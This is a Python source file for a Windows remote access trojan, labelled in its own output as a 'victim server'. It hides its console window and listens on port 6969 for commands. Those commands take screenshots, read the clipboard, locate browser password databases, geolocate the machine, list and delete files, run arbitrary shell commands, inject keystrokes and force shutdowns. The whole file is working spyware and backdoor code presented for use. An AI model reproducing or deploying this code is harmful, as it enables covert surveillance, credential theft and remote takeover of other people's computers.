import socket
import pyautogui
import os
import io
import subprocess
import psutil
import requests
import time
import sys
import win32clipboard
import win32gui
import win32con
from PIL import ImageGrab
import threading
from geopy.geocoders import Nominatim
import wmi

# STEALTH STARTUP
def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

hide_console()

def get_public_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def get_location(ip):
    try:
        geolocator = Nominatim(user_agent="geoapi")
        location = geolocator.geocode(ip)
        return f"{location.address if location else 'Unknown'}"
    except: return "Geolocation failed"

def get_hardware():
    try:
        c = wmi.WMI()
        cpu = c.Win32_Processor()[0].Name
        gpu = c.Win32_VideoController()[0].Name
        ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)
        disk = psutil.disk_usage('/').total / (1024**3)
        return f"""💻 HARDWARE INFO:
CPU: {cpu}
GPU: {gpu}
RAM: {ram_gb}GB
Disk: {disk:.1f}GB
OS: {os.getenv('OS')[:50]}"""
    except: return "Hardware scan failed"

def get_password_locations():
    paths = []
    appdata = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    
    chrome = os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data")
    firefox = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
    edge = os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Login Data")
    
    if os.path.exists(chrome): paths.append(f"🔐 CHROME: {chrome}")
    if os.path.exists(firefox): paths.append(f"🔐 FIREFOX: {firefox}")
    if os.path.exists(edge): paths.append(f"🔐 EDGE: {edge}")
    
    return "\n".join(paths) or "No browser passwords found"

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data.decode('utf-8', errors='ignore')[:500]
        win32clipboard.CloseClipboard()
        return "Empty clipboard"
    except:
        return "Clipboard access denied"

def list_directory(path="."):
    try:
        if not os.path.exists(path): return f"❌ Path not found: {path}"
        files = []
        for item in os.listdir(path)[:30]:
            full_path = os.path.join(path, item)
            size = os.path.getsize(full_path) / 1024 if os.path.isfile(full_path) else 0
            files.append(f"{item} ({size:.1f}KB)")
        return f"📁 {path}\n" + "\n".join(files)
    except Exception as e:
        return f"❌ List error: {str(e)}"

# SERVER
def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 6969))
    s.listen(10)
    print("🔥 Victim server started on port 6969...")
    
    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except: pass

def handle_client(conn, addr):
    try:
        while True:
            cmd = conn.recv(1024).decode('utf-8', errors='ignore').strip()
            if not cmd: break
            
            print(f"📥 {addr}: {cmd}")
            response = ""
            
            if cmd == "!screenshot":
                screenshot = ImageGrab.grab()
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                img_data = img_buffer.getvalue()
                
                conn.send(len(img_data).to_bytes(4, 'big'))
                conn.send(img_data)
                continue
            
            elif cmd == "!getclip":
                response = get_clipboard()
            
            elif cmd == "!hardware":
                response = get_hardware()
            
            elif cmd == "!passwords":
                response = get_password_locations()
            
            elif cmd == "!ip":
                response = get_public_ip()
            
            elif cmd == "!adresse":
                ip = get_public_ip()
                response = get_location(ip)
            
            elif cmd.startswith("!list"):
                path = cmd.split(" ", 1)[1] if len(cmd.split()) > 1 else "."
                response = list_directory(path)
            
            elif cmd.startswith("!open"):
                app = cmd[6:].strip()
                try:
                    subprocess.Popen(app, shell=True)
                    response = f"✅ Opened: {app}"
                except Exception as e:
                    response = f"❌ Open failed: {e}"
            
            elif cmd.startswith("!type"):
                text = cmd[6:].strip()
                threading.Thread(target=lambda: pyautogui.write(text, interval=0.05)).start()
                response = f"⌨️ Typed: {text}"
            
            elif cmd.startswith("!delete"):
                path = cmd[8:].strip()
                try:
                    os.remove(path)
                    response = f"🗑️ Deleted: {path}"
                except Exception as e:
                    response = f"❌ Delete failed: {e}"
            
            elif cmd == "!shutdown":
                subprocess.Popen("shutdown /s /t 5", shell=True)
                response = "💥 Shutting down in 5s..."
            
            elif cmd == "!restart":
                subprocess.Popen("shutdown /r /t 5", shell=True)
                response = "🔄 Restarting in 5s..."
            
            else:
                response = "❓ Unknown command. Use: screenshot/getclip/hardware/passwords/ip/adresse/open/list/type/delete/shutdown"
            
            conn.send(response.encode('utf-8'))
    
    except Exception as e:
        print(f"Client {addr} disconnected: {e}")
    finally:
        conn.close()

if __name__ == "__main__":
    start_server()